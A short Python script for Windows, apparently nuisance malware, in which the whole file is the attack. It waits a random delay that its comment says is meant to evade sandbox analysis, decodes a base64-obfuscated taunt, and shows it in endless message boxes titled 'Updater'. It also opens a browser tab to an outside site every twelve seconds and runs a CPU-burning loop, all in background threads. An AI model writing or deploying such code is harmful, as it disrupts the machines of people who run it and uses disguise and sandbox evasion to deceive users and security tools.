
import os, time, ctypes, webbrowser, threading, base64, random

# Delay to evade sandbox analysis
time.sleep(random.randint(15, 40))

# Obfuscated message
msg = base64.b64decode("WW91IHNob3VsZCBiZSB3b3JraW5nIG5vdCBwbGF5aW5nISA=").decode()

# Function with benign-looking name
def ux_notify():
    while True:
        ctypes.windll.user32.MessageBoxW(0, msg, "Updater", 0x40)
        time.sleep(5)

# Function to simulate browser pings (uses a less obvious URL)
def bg_ping():
    while True:
        webbrowser.open("https://httpstat.us/200")
        time.sleep(12)

# Mild CPU stressor
def idle_task():
    while True:
        _ = [x**2 for x in range(5000)]

if __name__ == "__main__":
    threading.Thread(target=ux_notify, daemon=True).start()
    threading.Thread(target=bg_ping, daemon=True).start()
    threading.Thread(target=idle_task, daemon=True).start()
    while True:
        time.sleep(1)
